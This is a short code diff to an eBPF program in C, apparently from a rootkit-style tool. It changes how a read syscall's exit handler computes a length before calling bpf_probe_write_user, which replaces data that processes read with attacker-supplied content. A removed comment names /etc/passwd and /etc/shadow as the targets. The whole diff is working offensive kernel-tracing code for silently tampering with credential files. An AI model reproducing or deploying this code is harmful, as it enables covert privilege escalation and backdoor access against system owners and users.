@@ -408,10 +408,18 @@ int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
         {
             return 0; // You should not be here
         }
-        if (ctx->ret > 0 && ctx->ret <= sizeof(file->buff))
+        int overwrite_len = 0; // need to reach to ctx->ret
+        for (int i = 0; i < 6500; i += 1) // arbitrary value
         {
-            // bpf_printk("OVERWRITTEN PASSWD/SHADOW");
-            bpf_probe_write_user((void *)e->buff, (void *)file->buff, ctx->ret);
+            if (i + 1 > ctx->ret)
+            {
+                overwrite_len = i;
+                break;
+            }
+        }
+        if (overwrite_len > 0 && overwrite_len <= sizeof(file->buff) && overwrite_len <= ctx->ret)
+        {
+            bpf_probe_write_user((void *)e->buff, (void *)file->buff, overwrite_len);
         }
     }
 
